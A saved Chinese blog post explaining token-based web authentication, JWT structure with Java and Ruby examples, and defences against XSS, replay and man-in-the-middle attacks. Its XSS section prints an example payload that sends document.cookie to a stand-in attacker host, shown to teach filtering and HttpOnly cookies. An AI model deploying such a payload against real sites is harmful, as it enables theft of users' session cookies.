<!DOCTYPE html>
<!-- saved from url=(0045)http://www.cnblogs.com/xiekeli/p/5607107.html -->
<html lang="zh-cn"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script async="" src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/tongji.js.下载"></script>

<meta name="viewport" content="width=device-width, initial-scale=1">
<title>基于Token的WEB后台认证机制 - 红心李 - 博客园</title>
<link type="text/css" rel="stylesheet" href="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/blog-common.css">
<link id="MainCss" type="text/css" rel="stylesheet" href="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/bundle-SimpleMemory.css">
<link id="mobile-style" media="only screen and (max-width: 768px)" type="text/css" rel="stylesheet" href="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/bundle-SimpleMemory-mobile.css">
<link title="RSS" type="application/rss+xml" rel="alternate" href="http://www.cnblogs.com/xiekeli/rss">
<link title="RSD" type="application/rsd+xml" rel="EditURI" href="http://www.cnblogs.com/xiekeli/rsd.xml">
<link type="application/wlwmanifest+xml" rel="wlwmanifest" href="http://www.cnblogs.com/xiekeli/wlwmanifest.xml">
<script async="" src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/analytics.js.下载"></script><script src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/jquery.js.下载" type="text/javascript"></script>  
<script type="text/javascript">var currentBlogApp = 'xiekeli', cb_enable_mathjax=false;var isLogined=false;</script>
<script src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/blog-common.js.下载" type="text/javascript"></script>
</head>
<body>
<a name="top"></a>

<!--done-->
<div id="home">
<div id="header">
	<div id="blogTitle">
	<a id="lnkBlogLogo" href="http://www.cnblogs.com/xiekeli/"><img id="blogLogo" src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/logo.gif" alt="返回主页"></a>			
		
<!--done-->
<h1><a id="Header1_HeaderTitle" class="headermaintitle" href="http://www.cnblogs.com/xiekeli/">程序员的自我修养</a></h1>
<h2></h2>



		
	</div><!--end: blogTitle 博客的标题和副标题 -->
	<div id="navigator">
		
<ul id="navList">
<li><a id="blog_nav_sitehome" class="menu" href="http://www.cnblogs.com/">博客园</a></li>
<li><a id="blog_nav_myhome" class="menu" href="http://www.cnblogs.com/xiekeli/">首页</a></li>
<li><a id="blog_nav_newpost" class="menu" rel="nofollow" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">新随笔</a></li>
<li><a id="blog_nav_contact" class="menu" rel="nofollow" href="https://msg.cnblogs.com/send/%E7%BA%A2%E5%BF%83%E6%9D%8E">联系</a></li>
<li><a id="blog_nav_rss" class="menu" href="http://www.cnblogs.com/xiekeli/rss">订阅</a>
<!--<a id="blog_nav_rss_image" class="aHeaderXML" href="http://www.cnblogs.com/xiekeli/rss"><img src="//www.cnblogs.com/images/xml.gif" alt="订阅" /></a>--></li>
<li><a id="blog_nav_admin" class="menu" rel="nofollow" href="https://i.cnblogs.com/">管理</a></li>
</ul>
		<div class="blogStats">
			
			<div id="blog_stats">
<span id="stats_post_count">随笔 - 35&nbsp; </span>
<span id="stats_article_count">文章 - 56&nbsp; </span>
<span id="stats-comment_count">评论 - 133</span>
</div>
			
		</div><!--end: blogStats -->
	</div><!--end: navigator 博客导航栏 -->
</div><!--end: header 头部 -->

<div id="main">
	<div id="mainContent">
	<div class="forFlow">
		
<div id="post_detail">
<!--done-->
<div id="topics">
	<div class="post">
		<h1 class="postTitle">
			<a id="cb_post_title_url" class="postTitle2" href="http://www.cnblogs.com/xiekeli/p/5607107.html">基于Token的WEB后台认证机制</a>
		</h1>
		<div class="clear"></div>
		<div class="postBody">
			<div id="cnblogs_post_body" class="cnblogs-markdown"><h2 id="几种常用的认证机制">几种常用的认证机制</h2>
<h3 id="http-basic-auth">HTTP Basic Auth</h3>
<p>HTTP Basic Auth简单点说明就是每次请求API时都提供用户的username和password，简言之，Basic Auth是配合RESTful API 使用的最简单的认证方式，只需提供用户名密码即可，但由于有把用户名密码暴露给第三方客户端的风险，在生产环境下被使用的越来越少。因此，在开发对外开放的RESTful API时，尽量避免采用HTTP Basic Auth</p>
<h3 id="oauth">OAuth</h3>
<p>OAuth（开放授权）是一个开放的授权标准，允许用户让第三方应用访问该用户在某一web服务上存储的私密的资源（如照片，视频，联系人列表），而无需将用户名和密码提供给第三方应用。</p>
<p>OAuth允许用户提供一个令牌，而不是用户名和密码来访问他们存放在特定服务提供者的数据。每一个令牌授权一个特定的第三方系统（例如，视频编辑网站)在特定的时段（例如，接下来的2小时内）内访问特定的资源（例如仅仅是某一相册中的视频）。这样，OAuth让用户可以授权第三方网站访问他们存储在另外服务提供者的某些特定信息，而非所有内容<br>
下面是OAuth2.0的流程：<br>
<img src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/34831-20160622150107172-139099471.png"></p>
<p>这种基于OAuth的认证机制适用于个人消费者类的互联网产品，如社交类APP等应用，但是不太适合拥有自有认证权限管理的企业应用；</p>
<h3 id="cookie-auth">Cookie Auth</h3>
<p>Cookie认证机制就是为一次请求认证在服务端创建一个Session对象，同时在客户端的浏览器端创建了一个Cookie对象；通过客户端带上来Cookie对象来与服务器端的session对象匹配来实现状态管理的。默认的，当我们关闭浏览器的时候，cookie会被删除。但可以通过修改cookie 的expire time使cookie在一定时间内有效；</p>
<h3 id="token-auth">Token Auth</h3>
<p><img src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/34831-20160622150124531-1416052185.png"></p>
<h4 id="token-auth的优点">Token Auth的优点</h4>
<p>Token机制相对于Cookie机制又有什么好处呢？</p>
<ul>
<li><strong>支持跨域访问</strong>: Cookie是不允许垮域访问的，这一点对Token机制是不存在的，前提是传输的用户认证信息通过HTTP头传输.</li>
<li><strong>无状态(也称：服务端可扩展行)</strong>:Token机制在服务端不需要存储session信息，因为Token 自身包含了所有登录用户的信息，只需要在客户端的cookie或本地介质存储状态信息.</li>
<li><strong>更适用CDN</strong>: 可以通过内容分发网络请求你服务端的所有资料（如：javascript，HTML,图片等），而你的服务端只要提供API即可.</li>
<li><strong>去耦</strong>: 不需要绑定到一个特定的身份验证方案。Token可以在任何地方生成，只要在你的API被调用的时候，你可以进行Token生成调用即可.</li>
<li><strong>更适用于移动应用</strong>: 当你的客户端是一个原生平台（iOS, Android，Windows 8等）时，Cookie是不被支持的（你需要通过Cookie容器进行处理），这时采用Token认证机制就会简单得多。</li>
<li><strong>CSRF</strong>:因为不再依赖于Cookie，所以你就不需要考虑对CSRF（跨站请求伪造）的防范。</li>
<li><strong>性能</strong>: 一次网络往返时间（通过数据库查询session信息）总比做一次HMACSHA256计算 的Token验证和解析要费时得多.</li>
<li><strong>不需要为登录页面做特殊处理</strong>: 如果你使用Protractor 做功能测试的时候，不再需要为登录页面做特殊处理.</li>
<li><strong>基于标准化</strong>:你的API可以采用标准化的 JSON Web Token (JWT). 这个标准已经存在多个后端库（.NET, Ruby, Java,Python, PHP）和多家公司的支持（如：Firebase,Google, Microsoft）.</li>
</ul>
<h2 id="基于jwt的token认证机制实现">基于JWT的Token认证机制实现</h2>
<p>JSON Web Token（JWT）是一个非常轻巧的规范。这个规范允许我们使用JWT在用户和服务器之间传递安全可靠的信息。其</p>
<h3 id="jwt的组成">JWT的组成</h3>
<p>一个JWT实际上就是一个字符串，它由三部分组成，头部、载荷与签名。<br>
<strong>载荷（Payload）</strong></p>
<pre><code class="hljs json">{ "<span class="hljs-attr">iss</span>": <span class="hljs-string">"Online JWT Builder"</span>, 
  "<span class="hljs-attr">iat</span>": <span class="hljs-number">1416797419</span>, 
  "<span class="hljs-attr">exp</span>": <span class="hljs-number">1448333419</span>, 
  "<span class="hljs-attr">aud</span>": <span class="hljs-string">"www.example.com"</span>, 
  "<span class="hljs-attr">sub</span>": <span class="hljs-string">"jrocket@example.com"</span>, 
  "<span class="hljs-attr">GivenName</span>": <span class="hljs-string">"Johnny"</span>, 
  "<span class="hljs-attr">Surname</span>": <span class="hljs-string">"Rocket"</span>, 
  "<span class="hljs-attr">Email</span>": <span class="hljs-string">"jrocket@example.com"</span>, 
  "<span class="hljs-attr">Role</span>": [ <span class="hljs-string">"Manager"</span>, <span class="hljs-string">"Project Administrator"</span> ] 
}</code></pre>
<ul>
<li>iss: 该JWT的签发者，是否使用是可选的；</li>
<li>sub: 该JWT所面向的用户，是否使用是可选的；</li>
<li>aud: 接收该JWT的一方，是否使用是可选的；</li>
<li>exp(expires): 什么时候过期，这里是一个Unix时间戳，是否使用是可选的；</li>
<li>iat(issued at): 在什么时候签发的(UNIX时间)，是否使用是可选的；<br>
其他还有：</li>
<li>nbf (Not Before)：如果当前时间在nbf里的时间之前，则Token不被接受；一般都会留一些余地，比如几分钟；，是否使用是可选的；</li>
</ul>
<p>将上面的JSON对象进行[base64编码]可以得到下面的字符串。这个字符串我们将它称作JWT的Payload（载荷）。</p>
<pre><code class="hljs objectivec">eyJpc3MiOiJKb2huIFd1IEpXV<span class="hljs-built_in">CIsImlhdCI6MTQ0MTU5MzUwMiwiZXhwIjoxNDQxNTk0NzIyLCJhdWQiOiJ3d3cuZXhhbXBsZS5jb20iLCJzdWIiOiJqcm9ja2V0QGV4YW1wbGUuY29tIiwiZnJvbV91c2VyIjoiQiIsInRhcmdldF91c2VyIjoiQSJ9</span></code></pre>
<p>小知识：Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于2的6次方等于64，所以每6个比特为一个单元，对应某个可打印字符。三个字节有24个比特，对应于4个Base64单元，即3个字节需要用4个可打印字符来表示。JDK 中提供了非常方便的 <strong>BASE64Encoder</strong> 和 <strong>BASE64Decoder</strong>，用它们可以非常方便的完成基于 BASE64 的编码和解码</p>
<p><strong>头部（Header）</strong><br>
JWT还需要一个头部，头部用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等。这也可以被表示成一个JSON对象。</p>
<pre><code class="hljs json">{
"<span class="hljs-attr">typ</span>": <span class="hljs-string">"JWT"</span>,
"<span class="hljs-attr">alg</span>": <span class="hljs-string">"HS256"</span>
}</code></pre>
<p>在头部指明了签名算法是HS256算法。<br>
当然头部也要进行BASE64编码，编码后的字符串如下：</p>
<pre><code class="hljs">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</code></pre>
<p><strong>签名（Signature）</strong><br>
将上面的两个编码后的字符串都用句号.连接在一起（头部在前），就形成了:</p>
<pre><code class="hljs css"><span class="hljs-selector-tag">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><span class="hljs-selector-class">.eyJmcm9tX3VzZXIiOiJCIiwidGFyZ2V0X3VzZXIiOiJBIn0</span></code></pre>
<p>最后，我们将上面拼接完的字符串用HS256算法进行加密。在加密的时候，我们还需要提供一个密钥（secret）。如果我们用mystar作为密钥的话，那么就可以得到我们加密后的内容:</p>
<pre><code class="hljs">rSWamyAYwuHCo7IFAgd1oRpSP7nzL7BF5t7ItqpKViM</code></pre>
<p>最后将这一部分签名也拼接在被签名的字符串后面，我们就得到了完整的JWT:</p>
<pre><code class="hljs css"><span class="hljs-selector-tag">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><span class="hljs-selector-class">.eyJmcm9tX3VzZXIiOiJCIiwidGFyZ2V0X3VzZXIiOiJBIn0</span><span class="hljs-selector-class">.rSWamyAYwuHCo7IFAgd1oRpSP7nzL7BF5t7ItqpKViM</span></code></pre>
<p>在我们的请求URL中会带上这串JWT字符串：</p>
<pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//your.awesome-app.com/make-friend/?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcm9tX3VzZXIiOiJCIiwidGFyZ2V0X3VzZXIiOiJBIn0.rSWamyAYwuHCo7IFAgd1oRpSP7nzL7BF5t7ItqpKViM</span></code></pre>
<h3 id="认证过程">认证过程</h3>
<p>下面我们从一个实例来看如何运用JWT机制实现认证：</p>
<h4 id="登录">登录</h4>
<ul>
<li>第一次认证：第一次登录，用户从浏览器输入用户名/密码，提交后到服务器的登录处理的Action层（Login Action）；</li>
<li>Login Action调用认证服务进行用户名密码认证，如果认证通过，Login Action层调用用户信息服务获取用户信息（包括完整的用户信息及对应权限信息）；</li>
<li>返回用户信息后，Login Action从配置文件中获取Token签名生成的秘钥信息，进行Token的生成；</li>
<li>生成Token的过程中可以调用第三方的JWT Lib生成签名后的JWT数据；</li>
<li>完成JWT数据签名后，将其设置到COOKIE对象中，并重定向到首页，完成登录过程；</li>
</ul>
<p><img src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/34831-20160622152259735-1969767936.jpg"></p>
<h4 id="请求认证">请求认证</h4>
<p>基于Token的认证机制会在每一次请求中都带上完成签名的Token信息，这个Token信息可能在COOKIE<br>
中，也可能在HTTP的Authorization头中；</p>
<p><img src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/34831-20160622152344250-1238130627.jpg"></p>
<ul>
<li>客户端（APP客户端或浏览器）通过GET或POST请求访问资源（页面或调用API）；</li>
<li>认证服务作为一个Middleware HOOK 对请求进行拦截，首先在cookie中查找Token信息，如果没有找到，则在HTTP Authorization Head中查找；</li>
<li>如果找到Token信息，则根据配置文件中的签名加密秘钥，调用JWT Lib对Token信息进行解密和解码；</li>
<li>完成解码并验证签名通过后，对Token中的exp、nbf、aud等信息进行验证；</li>
<li>全部通过后，根据获取的用户的角色权限信息，进行对请求的资源的权限逻辑判断；</li>
<li>如果权限逻辑判断通过则通过Response对象返回；否则则返回HTTP 401；</li>
</ul>
<h3 id="对token认证的五点认识">对Token认证的五点认识</h3>
<p>对Token认证机制有5点直接注意的地方：</p>
<ul>
<li>一个Token就是一些信息的集合；</li>
<li>在Token中包含足够多的信息，以便在后续请求中减少查询数据库的几率；</li>
<li>服务端需要对cookie和HTTP Authrorization Header进行Token信息的检查；</li>
<li>基于上一点，你可以用一套token认证代码来面对浏览器类客户端和非浏览器类客户端；</li>
<li>因为token是被签名的，所以我们可以认为一个可以解码认证通过的token是由我们系统发放的，其中带的信息是合法有效的；</li>
</ul>
<h3 id="jwt的java实现">JWT的JAVA实现</h3>
<p>Java中对JWT的支持可以考虑使用<a href="https://github.com/jwtk/jjwt">JJWT</a>开源库；JJWT实现了JWT, JWS, JWE 和 JWA RFC规范；下面将简单举例说明其使用：<br>
<strong>生成Token码</strong></p>
<pre><code class="hljs typescript"><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;
<span class="hljs-keyword">import</span> javax.xml.bind.DatatypeConverter;
<span class="hljs-keyword">import</span> java.security.Key;
<span class="hljs-keyword">import</span> io.jsonwebtoken.*;
<span class="hljs-keyword">import</span> java.util.Date;    
 
<span class="hljs-comment">//Sample method to construct a JWT</span>
 
<span class="hljs-keyword">private</span> <span class="hljs-built_in">String</span> createJWT(<span class="hljs-built_in">String</span> id, <span class="hljs-built_in">String</span> issuer, <span class="hljs-built_in">String</span> subject, long ttlMillis) {
 
<span class="hljs-comment">//The JWT signature algorithm we will be using to sign the token</span>
SignatureAlgorithm signatureAlgorithm = SignatureAlgorithm.HS256;
 
long nowMillis = System.currentTimeMillis();
<span class="hljs-built_in">Date</span> now = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(nowMillis);
 
<span class="hljs-comment">//We will sign our JWT with our ApiKey secret</span>
byte[] apiKeySecretBytes = DatatypeConverter.parseBase64Binary(apiKey.getSecret());
Key signingKey = <span class="hljs-keyword">new</span> SecretKeySpec(apiKeySecretBytes, signatureAlgorithm.getJcaName());
 
  <span class="hljs-comment">//Let's set the JWT Claims</span>
JwtBuilder builder = Jwts.builder().setId(id)
                                .setIssuedAt(now)
                                .setSubject(subject)
                                .setIssuer(issuer)
                                .signWith(signatureAlgorithm, signingKey);
 
<span class="hljs-comment">//if it has been specified, let's add the expiration</span>
<span class="hljs-keyword">if</span> (ttlMillis &gt;= <span class="hljs-number">0</span>) {
    long expMillis = nowMillis + ttlMillis;
    <span class="hljs-built_in">Date</span> exp = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(expMillis);
    builder.setExpiration(exp);
}
 
<span class="hljs-comment">//Builds the JWT and serializes it to a compact, URL-safe string</span>
<span class="hljs-keyword">return</span> builder.compact();
}</code></pre>
<p><strong>解码和验证Token码</strong></p>
<pre><code class="hljs swift"><span class="hljs-keyword">import</span> javax.xml.bind.DatatypeConverter;
<span class="hljs-keyword">import</span> io.jsonwebtoken.Jwts;
<span class="hljs-keyword">import</span> io.jsonwebtoken.Claims;
 
<span class="hljs-comment">//Sample method to validate and read the JWT</span>
<span class="hljs-keyword">private</span> void parseJWT(<span class="hljs-type">String</span> jwt) {
<span class="hljs-comment">//This line will throw an exception if it is not a signed JWS (as expected)</span>
<span class="hljs-type">Claims</span> claims = <span class="hljs-type">Jwts</span>.parser()        
   .setSigningKey(<span class="hljs-type">DatatypeConverter</span>.parseBase64Binary(apiKey.getSecret()))
   .parseClaimsJws(jwt).getBody();
<span class="hljs-type">System</span>.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"ID: "</span> + claims.getId());
<span class="hljs-type">System</span>.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"Subject: "</span> + claims.getSubject());
<span class="hljs-type">System</span>.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"Issuer: "</span> + claims.getIssuer());
<span class="hljs-type">System</span>.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"Expiration: "</span> + claims.getExpiration());
}
</code></pre>
<h2 id="基于jwt的token认证的安全问题">基于JWT的Token认证的安全问题</h2>
<h3 id="确保验证过程的安全性">确保验证过程的安全性</h3>
<p>如何保证用户名/密码验证过程的安全性；因为在验证过程中，需要用户输入用户名和密码，在这一过程中，用户名、密码等敏感信息需要在网络中传输。因此，在这个过程中建议采用HTTPS，通过SSL加密传输，以确保通道的安全性。</p>
<h3 id="如何防范xss-attacks">如何防范XSS Attacks</h3>
<p>浏览器可以做很多事情，这也给浏览器端的安全带来很多隐患，最常见的如：XSS攻击：跨站脚本攻击(Cross Site Scripting)；如果有个页面的输入框中允许输入任何信息，且没有做防范措施，如果我们输入下面这段代码：</p>
<pre><code class="hljs coffeescript">&lt;img src=<span class="hljs-string">"x"</span> <span class="hljs-regexp">/&gt; a.src='https:/</span><span class="hljs-regexp">/hackmeplz.com/yourCookies.png/</span>?cookies=’
+<span class="hljs-built_in">document</span>.cookie;<span class="hljs-keyword">return</span> a}())<span class="hljs-string">"</span></code></pre>
<p>这段代码会盗取你域中的所有cookie信息，并发送到 hackmeplz.com；那么我们如何来防范这种攻击呢？</p>
<ul>
<li><strong>XSS攻击代码过滤</strong><br>
移除任何会导致浏览器做非预期执行的代码，这个可以采用一些库来实现（如：js下的js-xss，JAVA下的XSS HTMLFilter，PHP下的TWIG）；如果你是将用户提交的字符串存储到数据库的话（也针对SQL注入攻击），你需要在前端和服务端分别做过滤；</li>
<li><strong>采用HTTP-Only Cookies</strong><br>
通过设置Cookie的参数： HttpOnly; Secure 来防止通过JavaScript 来访问Cookie；<br>
如何在Java中设置cookie是HttpOnly呢？<br>
Servlet 2.5 API 不支持 cookie设置HttpOnly<br>
<a href="http://docs.oracle.com/cd/E17802_01/products/products/servlet/2.5/docs/servlet-2_5-mr2/" class="uri">http://docs.oracle.com/cd/E17802_01/products/products/servlet/2.5/docs/servlet-2_5-mr2/</a><br>
建议升级Tomcat7.0，它已经实现了Servlet3.0<br>
<a href="http://tomcat.apache.org/tomcat-7.0-doc/servletapi/javax/servlet/http/Cookie.html" class="uri">http://tomcat.apache.org/tomcat-7.0-doc/servletapi/javax/servlet/http/Cookie.html</a><br>
或者通过这样来设置：</li>
</ul>
<pre><code class="hljs sql">//设置cookie
response.addHeader("<span class="hljs-keyword">Set</span>-Cookie<span class="hljs-string">", "</span>uid=<span class="hljs-number">112</span>; Path=/; HttpOnly");

//设置多个cookie
response.addHeader("<span class="hljs-keyword">Set</span>-Cookie<span class="hljs-string">", "</span>uid=<span class="hljs-number">112</span>; Path=/; HttpOnly");
response.addHeader("<span class="hljs-keyword">Set</span>-Cookie<span class="hljs-string">", "</span><span class="hljs-keyword">timeout</span>=<span class="hljs-number">30</span>; Path=/test; HttpOnly");

//设置https的cookie
response.addHeader("<span class="hljs-keyword">Set</span>-Cookie<span class="hljs-string">", "</span>uid=<span class="hljs-number">112</span>; Path=/; Secure; HttpOnly");
</code></pre>
<p>在实际使用中，我们可以使FireCookie查看我们设置的Cookie 是否是HttpOnly；</p>
<h3 id="如何防范replay-attacks">如何防范Replay Attacks</h3>
<p>所谓重放攻击就是攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程。比如在浏览器端通过用户名/密码验证获得签名的Token被木马窃取。即使用户登出了系统，黑客还是可以利用窃取的Token模拟正常请求，而服务器端对此完全不知道，以为JWT机制是无状态的。<br>
针对这种情况，有几种常用做法可以用作参考：<br>
1、时间戳 +共享秘钥<br>
这种方案，客户端和服务端都需要知道：</p>
<ul>
<li>User ID</li>
<li>共享秘钥</li>
</ul>
<p><strong>客户端</strong></p>
<pre><code class="hljs dts">auth_header = JWT.encode({
<span class="hljs-symbol">  user_id:</span> <span class="hljs-number">123</span>,
<span class="hljs-symbol">  iat:</span> Time.now.to_i,      <span class="hljs-meta"># 指定token发布时间</span>
<span class="hljs-symbol">  exp:</span> Time.now.to_i + <span class="hljs-number">2</span>   <span class="hljs-meta"># 指定token过期时间为2秒后，2秒时间足够一次HTTP请求，同时在一定程度确保上一次token过期，减少replay attack的概率；</span>
}, <span class="hljs-string">"&lt;my shared secret&gt;"</span>)
RestClient.get(<span class="hljs-string">"http://api.example.com/"</span>, authorization: auth_header)
</code></pre>
<p><strong>服务端</strong></p>
<pre><code class="hljs ruby"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApiController</span> &lt; ActionController::Base</span>
  <span class="hljs-keyword">attr_reader</span> <span class="hljs-symbol">:current_user</span>
  before_action <span class="hljs-symbol">:set_current_user_from_jwt_token</span>

  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_current_user_from_jwt_token</span></span>
    <span class="hljs-comment"># Step 1:解码JWT，并获取User ID，这个时候不对Token签名进行检查</span>
    <span class="hljs-comment"># the signature. Note JWT tokens are *not* encrypted, but signed.</span>
    payload = JWT.decode(request.authorization, <span class="hljs-keyword">nil</span>, <span class="hljs-keyword">false</span>)

    <span class="hljs-comment"># Step 2: 检查该用户是否存在于数据库</span>
    @current_user = User.find(payload[<span class="hljs-string">'user_id'</span>])
    
    <span class="hljs-comment"># Step 3: 检查Token签名是否正确.</span>
    JWT.decode(request.authorization, current_user.api_secret)
    
    <span class="hljs-comment"># Step 4: 检查 "iat" 和"exp" 以确保这个Token是在2秒内创建的.</span>
    now = Time.now.to_i
    <span class="hljs-keyword">if</span> payload[<span class="hljs-string">'iat'</span>] &gt; now || payload[<span class="hljs-string">'exp'</span>] &lt; now
      <span class="hljs-comment"># 如果过期则返回401</span>
    <span class="hljs-keyword">end</span>
  <span class="hljs-keyword">rescue</span> <span class="hljs-symbol">JWT:</span><span class="hljs-symbol">:DecodeError</span>
    <span class="hljs-comment"># 返回 401</span>
  <span class="hljs-keyword">end</span>
<span class="hljs-keyword">end</span>
</code></pre>
<p>2、时间戳 +共享秘钥+黑名单 （类似<a href="https://support.zendesk.com/hc/en-us/articles/203663816-Setting-up-single-sign-on-with-JWT-JSON-Web-Token-">Zendesk</a>的做法）<br>
<strong>客户端</strong></p>
<pre><code class="hljs yaml">auth_header = JWT.encode({
<span class="hljs-attr">  user_id:</span> <span class="hljs-number">123</span>,
<span class="hljs-attr">  jti:</span> rand(<span class="hljs-number">2</span> &lt;&lt; <span class="hljs-number">64</span>).to_s,  <span class="hljs-comment"># 通过jti确保一个token只使用一次，防止replace attack</span>
<span class="hljs-attr">  iat:</span> Time.now.to_i,       <span class="hljs-comment"># 指定token发布时间.</span>
<span class="hljs-attr">  exp:</span> Time.now.to_i + <span class="hljs-number">2</span>    <span class="hljs-comment"># 指定token过期时间为2秒后</span>
}, <span class="hljs-string">"&lt;my shared secret&gt;"</span>)
RestClient.get(<span class="hljs-string">"http://api.example.com/"</span>, authorization: auth_header)</code></pre>
<p><strong>服务端</strong></p>
<pre><code class="hljs ruby"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_current_user_from_jwt_token</span></span>
  <span class="hljs-comment"># 前面的步骤参考上面</span>
  payload = JWT.decode(request.authorization, <span class="hljs-keyword">nil</span>, <span class="hljs-keyword">false</span>)
  @current_user = User.find(payload[<span class="hljs-string">'user_id'</span>])
  JWT.decode(request.authorization, current_user.api_secret)
  now = Time.now.to_i
  <span class="hljs-keyword">if</span> payload[<span class="hljs-string">'iat'</span>] &gt; now || payload[<span class="hljs-string">'exp'</span>] &lt; now
    <span class="hljs-comment"># 返回401</span>
  <span class="hljs-keyword">end</span>
  
  <span class="hljs-comment"># 下面将检查确保这个JWT之前没有被使用过</span>
  <span class="hljs-comment"># 使用Redis的原子操作</span>
  
  <span class="hljs-comment"># The redis 的键: &lt;user id&gt;:&lt;one-time use token&gt;</span>
  key = <span class="hljs-string">"<span class="hljs-subst">#{payload[<span class="hljs-string">'user_id'</span>]}</span>:<span class="hljs-subst">#{payload[<span class="hljs-string">'jti'</span>]}</span>"</span>
  
  <span class="hljs-comment"># 看键值是否在redis中已经存在. 如果不存在则返回nil. 如果存在则返回“1”. .</span>
  <span class="hljs-keyword">if</span> redis.getset(key, <span class="hljs-string">"1"</span>)
    <span class="hljs-comment"># 返回401</span>
    <span class="hljs-comment"># </span>
  <span class="hljs-keyword">end</span>
  
  <span class="hljs-comment"># 进行键值过期检查</span>
  redis.expireat(key, payload[<span class="hljs-string">'exp'</span>] + <span class="hljs-number">2</span>)
<span class="hljs-keyword">end</span>
</code></pre>
<h3 id="如何防范mitm-man-in-the-middleattacks">如何防范MITM （Man-In-The-Middle）Attacks</h3>
<p>所谓MITM攻击，就是在客户端和服务器端的交互过程被监听，比如像可以上网的咖啡馆的WIFI被监听或者被黑的代理服务器等；<br>
针对这类攻击的办法使用HTTPS，包括针对分布式应用，在服务间传输像cookie这类敏感信息时也采用HTTPS；所以云计算在本质上是不安全的。</p>
<p>参考目录：<br>
<a href="https://stormpath.com/blog/build-secure-user-interfaces-using-jwts" class="uri">https://stormpath.com/blog/build-secure-user-interfaces-using-jwts</a><br>
<a href="https://auth0.com/blog/2014/01/27/ten-things-you-should-know-about-tokens-and-cookies/" class="uri">https://auth0.com/blog/2014/01/27/ten-things-you-should-know-about-tokens-and-cookies/</a><br>
<a href="https://www.quora.com/Is-JWT-JSON-Web-Token-insecure-by-design" class="uri">https://www.quora.com/Is-JWT-JSON-Web-Token-insecure-by-design</a><br>
<a href="https://github.com/auth0/node-jsonwebtoken/issues/36" class="uri">https://github.com/auth0/node-jsonwebtoken/issues/36</a><br>
<a href="http://christhorntonsf.com/secure-your-apis-with-jwt/" class="uri">http://christhorntonsf.com/secure-your-apis-with-jwt/</a></p>
</div><div id="MySignature"></div>
<div class="clear"></div>
<div id="blog_post_info_block">
<div id="BlogPostCategory">分类: <a href="http://www.cnblogs.com/xiekeli/category/343129.html" target="_blank">Web</a></div>
<div id="EntryTag"></div>
<div id="blog_post_info"><div id="green_channel">
        <a href="javascript:void(0);" id="green_channel_digg" onclick="DiggIt(5607107,cb_blogId,1);green_channel_success(this,&#39;谢谢推荐！&#39;);">好文要顶</a>
            <a id="green_channel_follow" onclick="follow(&#39;683f420b-63cf-dd11-9e4d-001cf0cd104b&#39;);" href="javascript:void(0);">关注我</a>
    <a id="green_channel_favorite" onclick="AddToWz(cb_entryId);return false;" href="javascript:void(0);">收藏该文</a>
    <a id="green_channel_weibo" href="javascript:void(0);" title="分享至新浪微博" onclick="ShareToTsina()"><img src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/icon_weibo_24.png" alt=""></a>
    <a id="green_channel_wechat" href="javascript:void(0);" title="分享至微信" onclick="shareOnWechat()"><img src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/wechat.png" alt=""></a>
</div>
<div id="author_profile">
    <div id="author_profile_info" class="author_profile_info">
            <a href="http://home.cnblogs.com/u/xiekeli/" target="_blank"><img src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/u34831.jpg" class="author_avatar" alt=""></a>
        <div id="author_profile_detail" class="author_profile_info">
            <a href="http://home.cnblogs.com/u/xiekeli/">红心李</a><br>
            <a href="http://home.cnblogs.com/u/xiekeli/followees">关注 - 4</a><br>
            <a href="http://home.cnblogs.com/u/xiekeli/followers">粉丝 - 150</a>
        </div>
    </div>
    <div class="clear"></div>
    <div id="author_profile_honor"></div>
    <div id="author_profile_follow">
                <a href="javascript:void(0);" onclick="follow(&#39;683f420b-63cf-dd11-9e4d-001cf0cd104b&#39;);return false;">+加关注</a>
    </div>
</div>
<div id="div_digg">
    <div class="diggit" onclick="votePost(5607107,&#39;Digg&#39;)">
        <span class="diggnum" id="digg_count">85</span>
    </div>
    <div class="buryit" onclick="votePost(5607107,&#39;Bury&#39;)">
        <span class="burynum" id="bury_count">0</span>
    </div>
    <div class="clear"></div>
    <div class="diggword" id="digg_tips">
    </div>
</div>
</div>
<div class="clear"></div>
<div id="post_next_prev"><a href="http://www.cnblogs.com/xiekeli/p/5398374.html" class="p_n_p_prefix">« </a> 上一篇：<a href="http://www.cnblogs.com/xiekeli/p/5398374.html" title="发布于2016-04-16 14:39">MySQL主键设计</a><br></div>
</div>


		</div>
